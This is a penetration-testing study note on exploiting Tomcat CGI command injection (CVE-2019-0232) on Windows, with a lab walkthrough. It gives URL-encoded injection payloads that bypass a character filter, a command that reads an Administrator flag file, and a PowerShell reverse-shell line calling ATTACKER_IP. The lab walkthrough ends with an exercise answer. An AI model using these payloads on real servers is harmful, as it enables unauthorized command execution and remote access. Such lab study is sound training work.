# Section 19 — Attacking Tomcat CGI (CVE-2019-0232)

**Affected:** Apache Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93 **on Windows**  
**Root cause:** CGI Servlet passes query string args to cmd.exe without sanitizing `&` (batch command separator) when `enableCmdLineArguments=true`.  
**Result:** Unauthenticated OS command injection via any accessible CGI script.

---

## Attack Flow

### 1 — Find a CGI script
```bash
# Default CGI directory is /cgi — fuzz .bat first on Windows, then .cmd
ffuf -w /usr/share/dirb/wordlists/common.txt \
  -u http://TARGET:8080/cgi/FUZZ.bat

ffuf -w /usr/share/dirb/wordlists/common.txt \
  -u http://TARGET:8080/cgi/FUZZ.cmd
```

### 2 — Confirm command injection with `dir`
```
http://TARGET:8080/cgi/welcome.bat?&dir
```

If the directory listing returns in the response → vulnerable.

### 3 — Check environment variables (dump PATH)
```
http://TARGET:8080/cgi/welcome.bat?&set
```

Key things to look for in the output:
- `COMSPEC=C:\Windows\system32\cmd.exe` — confirms Windows + full path to cmd
- `PATH=` — often **unset** on vulnerable installs → must hardcode full paths to binaries
- `SCRIPT_FILENAME=` — shows full path to the CGI script on disk

### 4 — Execute commands (URL-encode backslashes and colons)
```
# Plaintext (blocked by Tomcat's special-char filter):
http://TARGET:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe   ← BLOCKED

# URL-encoded (bypasses filter):
http://TARGET:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

| Character | URL-encoded |
|-----------|-------------|
| `:`       | `%3A`       |
| `\`       | `%5C`       |

### 5 — Quick reference payloads
```
# whoami
?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

# dir C:\
?&c%3A%5Cwindows%5Csystem32%5Ccmd.exe%20/c%20dir%20c%3A%5C

# type a file
?&c%3A%5Cwindows%5Csystem32%5Ccmd.exe%20/c%20type%20c%3A%5CUsers%5CAdministrator%5CDesktop%5Cflag.txt

# PowerShell reverse shell (via cmd)
?&c%3A%5Cwindows%5Csystem32%5Ccmd.exe%20/c%20powershell%20-nop%20-c%20"$client=New-Object%20System.Net.Sockets.TCPClient('ATTACKER_IP',4444)..."
```

---

## Exam Notes

- Only exploitable on **Windows** — Linux CGI doesn't have this `&` injection path
- `enableCmdLineArguments` is the key setting — enabled by default in affected versions
- CGI scripts are in `/cgi/` or sometimes `/cgi-bin/` — fuzz both
- `.bat` more common than `.cmd` on Windows Tomcat installs
- PATH is usually unset → always hardcode `c%3A%5Cwindows%5Csystem32%5C` prefix
- Tomcat's special-char filter blocks raw `\` and `:` → URL-encode them
- Service often runs as SYSTEM or a privileged local account — check whoami immediately

---

## Lab Walkthrough (`10.129.205.30` — ACADEMY-ACA-FELDSPAR)

**Nmap:**
```bash
nmap -p- -sC -Pn 10.129.205.30 --open
```
Key ports: 22 (SSH), 135/139/445 (SMB), 5985/47001 (WinRM), 8009 (AJP), **8080 (Tomcat 9.0.17)**

**Find CGI script:**
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt \
  -u http://10.129.205.30:8080/cgi/FUZZ.bat
# → welcome (200)
```

**Confirm injection:**
```
http://10.129.205.30:8080/cgi/welcome.bat?&dir  → directory listing returned
```

**Dump env to find PATH is unset:**
```
http://10.129.205.30:8080/cgi/welcome.bat?&set
# PATH not set → hardcode system32 path
```

**Q1 — whoami:**
```bash
curl "http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe"
```

**Answer:** `feldspar\omen`
